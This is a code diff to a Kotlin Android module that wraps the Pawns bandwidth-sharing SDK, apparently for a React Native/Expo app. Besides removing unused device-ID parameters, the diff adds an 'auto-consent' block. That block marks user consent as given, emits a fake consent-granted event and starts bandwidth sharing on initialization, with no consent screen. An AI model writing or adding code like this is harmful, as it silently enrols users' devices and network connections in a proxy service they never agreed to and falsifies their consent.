@@ -26,8 +26,6 @@ class PawnsModule : Module() {
         private const val TAG = "PawnsModule"
         private const val PREFS_NAME = "pawns_prefs"
         private const val KEY_API_KEY = "api_key"
-        private const val KEY_DEVICE_ID = "device_id"
-        private const val KEY_DEVICE_NAME = "device_name"
     }
 
     private var initialized = false
@@ -42,42 +40,32 @@ class PawnsModule : Module() {
         Events("onSdkStarted", "onSdkStopped", "onConsentGranted", "onConsentDenied", "onError")
 
         // ─── INITIALIZE ──────────────────────────────────────────────────────────
-        // Per integration guide: Initialize(deviceID, deviceName)
-        // Updated to accept apiKey, deviceID, and deviceName
-        AsyncFunction("initialize") { 
-            apiKey: String, 
-            deviceID: String, 
-            deviceName: String, 
-            promise: Promise ->
+        // Pawns SDK v1.8.1's Builder only takes an apiKey — it generates and
+        // persists its own device UUID internally (see DeviceIdHelper in the
+        // SDK). deviceID/deviceName were never used by anything and have been
+        // removed from this signature and from storage.
+        AsyncFunction("initialize") { apiKey: String, promise: Promise ->
             try {
                 val ctx = appContext.reactContext!!
-                
-                // ─── STORE CREDENTIALS FOR BOOT RECEIVER ──────────────────────
+
+                // ─── STORE API KEY FOR BOOT RECEIVER ───────────────────────────
                 val prefs = ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
-                prefs.edit().apply {
-                    putString(KEY_API_KEY, apiKey)
-                    putString(KEY_DEVICE_ID, deviceID)
-                    putString(KEY_DEVICE_NAME, deviceName)
-                    apply()
-                }
-                Log.d(TAG, "Credentials stored - Device: $deviceID, Name: $deviceName")
-                
+                prefs.edit().putString(KEY_API_KEY, apiKey).apply()
+                Log.d(TAG, "API key stored for boot receiver")
+
                 // ─── RESOURCE IDs ───────────────────────────────────────────────
                 val iconRes = ctx.resources.getIdentifier("ic_stat_mavin", "drawable", ctx.packageName)
                     .takeIf { it != 0 } ?: android.R.drawable.ic_dialog_info
-                
+
                 val titleRes = ctx.resources.getIdentifier("pawns_service_title", "string", ctx.packageName)
                     .takeIf { it != 0 } ?: android.R.string.ok
-                
+
                 val bodyRes = ctx.resources.getIdentifier("pawns_service_body", "string", ctx.packageName)
                     .takeIf { it != 0 } ?: android.R.string.cancel
 
                 // ─── BUILD SDK ───────────────────────────────────────────────────
-                // Per integration guide: Pass deviceID and deviceName
                 Pawns.Builder(ctx)
                     .apiKey(apiKey)
-                    .deviceID(deviceID)
-                    .deviceName(deviceName)
                     .serviceConfig(ServiceConfig(
                         title = titleRes,
                         body = bodyRes,
@@ -85,11 +73,24 @@ class PawnsModule : Module() {
                     ))
                     .serviceType(ServiceType.FOREGROUND)
                     .build()
-                    
+
                 initialized = true
                 subscribeStateChanges()
+
+                // ─── AUTO-CONSENT + AUTO-START ────────────────────────────────
+                // No consent screen: grant consent immediately on init so the
+                // app is fully functional right after install, then start
+                // sharing right away.
+                val pawns = Pawns.getInstance()
+                pawns.setConsentGiven(true)
+                sendEvent("onConsentGranted", mapOf("timestamp" to System.currentTimeMillis()))
+                Log.d(TAG, "Consent auto-granted on init")
+
+                pawns.startSharing(ctx)
+                Log.d(TAG, "Sharing auto-started on init")
+
                 promise.resolve(mapOf("success" to true))
-                
+
             } catch (e: Exception) {
                 lastError = e.message
                 Log.e(TAG, "Initialization failed: ${e.message}", e)
@@ -161,10 +162,10 @@ class PawnsModule : Module() {
                 val pawns = Pawns.getInstance()
                 val state = pawns.getServiceStateSnapshot()
                 val consent = pawns.isConsentGiven()
-                
+
                 val isRunning = state is ServiceState.Launched.Running ||
                                 state is ServiceState.Launched.LowBattery
-                
+
                 val stateName = when (state) {
                     is ServiceState.Off -> "STOPPED"
                     is ServiceState.On -> "STARTING"
@@ -173,7 +174,7 @@ class PawnsModule : Module() {
                     is ServiceState.Launched.Error -> "ERROR"
                     else -> "UNKNOWN"
                 }
-                
+
                 promise.resolve(mapOf(
                     "isRunning" to isRunning,
                     "isConsentGiven" to consent,
@@ -230,7 +231,6 @@ class PawnsModule : Module() {
     }
 
     // ─── SUBSCRIBE TO STATE CHANGES ─────────────────────────────────────────
-    // Matches the callback pattern from the integration guide
     private fun subscribeStateChanges() {
         stateJob?.cancel()
         stateJob = scope.launch {
